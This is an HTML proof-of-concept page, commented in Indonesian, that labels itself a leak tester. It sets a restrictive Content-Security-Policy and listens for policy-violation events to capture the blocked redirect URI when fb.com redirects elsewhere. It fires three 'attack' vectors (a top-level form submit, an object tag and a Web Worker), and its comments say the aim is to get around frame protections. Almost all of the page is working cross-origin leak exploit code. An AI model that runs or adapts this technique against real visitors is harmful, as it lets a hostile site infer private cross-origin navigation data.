<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Security-Policy" content="
        default-src 'self' 'unsafe-inline'; 
        form-action https://fb.com; 
        object-src https://fb.com; 
        worker-src https://fb.com;
    ">
    <title>No-Iframe CSP Leak</title>
    <style>
        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
        button { background: #f00; color: #fff; padding: 10px; border: none; cursor: pointer; font-weight: bold; }
        .log { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #222; word-break: break-all; }
        .alert { color: #f00; font-weight: bold; }
    </style>
</head>
<body>

    <h2>🚫 No-Iframe Leak Tester</h2>
    <p>Membuktikan kebocoran terjadi tanpa iframe, mem-bypass proteksi X-Frame-Options (XFO).</p>
    
    <button id="btnForm">Test 1: Top-Level Form Action</button>
    <button id="btnObject">Test 2: Object Tag</button>
    <button id="btnWorker">Test 3: Web Worker</button>

    <div id="logs"></div>

    <script>
        const targetUrl = 'https://fb.com/secret-path';
        const logs = document.getElementById('logs');

        // Listener CSP
        document.addEventListener('securitypolicyviolation', e => {
            const isLeaking = e.blockedURI.includes('facebook.com');
            const status = isLeaking ? '<span class="alert">[ LEAK DETECTED ]</span>' : '[ SAFE ]';
            
            logs.innerHTML += `
                <div class="log">
                    <b>Directive:</b> ${e.violatedDirective}<br>
                    <b>Status:</b> ${status}<br>
                    <b class="alert">Blocked URI: ${e.blockedURI}</b>
                </div>
            `;
            // Cancel form submission secara visual biar halaman gak pindah beneran kalau tembus
            e.preventDefault(); 
        });

        // 1. Serangan via Form (Top Level, bukan target iframe)
        document.getElementById('btnForm').addEventListener('click', () => {
            const form = document.createElement('form');
            form.action = targetUrl;
            form.method = 'GET';
            // Sengaja GAK PAKE target="..." biar jalan di current window (Top Level)
            document.body.appendChild(form);
            
            // Ketika redirect form diblokir CSP, browser nge-abort navigasi, 
            // jadi halaman kita gak hilang dan tetep bisa nangkep log-nya!
            form.submit();
        });

        // 2. Serangan via Object
        document.getElementById('btnObject').addEventListener('click', () => {
            const obj = document.createElement('object');
            obj.data = targetUrl;
            document.body.appendChild(obj);
        });

        // 3. Serangan via Worker (Latar Belakang)
        document.getElementById('btnWorker').addEventListener('click', () => {
            try {
                new Worker(targetUrl);
            } catch(err) {
                console.log("Worker creation failed/blocked");
            }
        });
    </script>

</body>
</html>
